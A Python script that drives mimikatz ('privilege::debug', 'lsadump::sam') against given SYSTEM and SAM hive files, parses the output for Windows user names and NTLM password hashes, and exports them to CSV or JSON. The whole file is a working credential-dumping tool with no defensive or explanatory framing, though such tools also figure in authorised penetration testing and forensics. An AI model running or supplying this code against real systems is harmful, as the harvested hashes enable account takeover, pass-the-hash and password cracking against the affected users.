import sys, subprocess, os, csv, json

def parse_mimikatz_output(output_file):
    user_ntlm_hashes = []
    try:
        file_obj = open(output_file, "r")

        mimikatz_output = file_obj.read()

        for i, line in enumerate(mimikatz_output.split("\n")):
            # Check the User line
            if "User" in line:
                user_line = line.strip()
                ntlm_hash_line = mimikatz_output.split("\n")[i + 1]
                
                # Check if next line contains the NTLM Hash
                if "Hash NTLM" in ntlm_hash_line:
                    ntlm_hash_line = ntlm_hash_line.strip()
                    
                    # Parse user and ntlm hash
                    user = user_line.split(" ")[2]
                    ntlm_hash = ntlm_hash_line.split(" ")[2]

                    user_ntlm_hashes.append({
                        "user": user,
                        "ntlm_hash": ntlm_hash
                    })
    except OSError as e:
        print("KO")
        print("Error opening file " + output_file)
        exit(1)
    
    return user_ntlm_hashes
                


if __name__ == "__main__":
    args = sys.argv

    system_file = args[1]
    sam_file = args[2]
    output_type = args[3]
    output_file_name = args[4]
    mimikatz_file = args[5]

    # If output_file_name is a path for a file get only the file
    output_file_name, output_file_extension = os.path.splitext(output_file_name)

    # Add a .txt extension just for mimikatz output file
    mimikatz_output_file = output_file_name + ".txt"

    # If mimikatz_output_file exists needs to be removed or it will append (we dont want that)
    try:
        os.remove(mimikatz_output_file)
    except OSError:
        pass
    
    # Call mimikatz executable for retrieval of Users and NTLM Hashes
    print("Executing mimikatz...", end="")
    p = subprocess.Popen(args=[mimikatz_file, "privilege::debug", "log {0}".format(mimikatz_output_file), "lsadump::sam /system:\"{0}\" /sam:\"{1}\"".format(system_file, sam_file), "exit"], stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False)

    try:
        outs, errs = p.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        # In case of error kill the process and exit with error code
        p.kill()
        outs, errs = p.communicate()
        print("OUTPUT: " + outs.decode("utf-8"))
        print("ERRORS: " + errs.decode("utf-8"))
        exit(1)

    print("OK")
    
    print("Parsing mimikatz output...", end="")
    user_ntlm_hashes = parse_mimikatz_output(mimikatz_output_file)
    print("OK")

    if output_type == "csv":
        print("Generating CSV file...", end="")
        # Parse User and NTLM Hash to CSV
        csv_file_name = output_file_name + ".csv"
        with open(csv_file_name, mode="w", newline="") as csv_file:
            field_names = ["User", "NTLM Hash"]

            writer = csv.DictWriter(csv_file, fieldnames=field_names)

            writer.writeheader()
            for user_ntlm_hash in user_ntlm_hashes:
                writer.writerow({
                    "User": user_ntlm_hash["user"],
                    "NTLM Hash": user_ntlm_hash["ntlm_hash"]
                })
        print("OK")
    elif output_type == "json":
        print("Generating JSON file...", end="")
        # Parse User and NTLM Hash to JSON
        json_file_name = output_file_name + ".json"

        file_obj = open(json_file_name, "w")

        file_obj.write(json.dumps(user_ntlm_hashes, indent=4))
        
        file_obj.close()

        print("OK")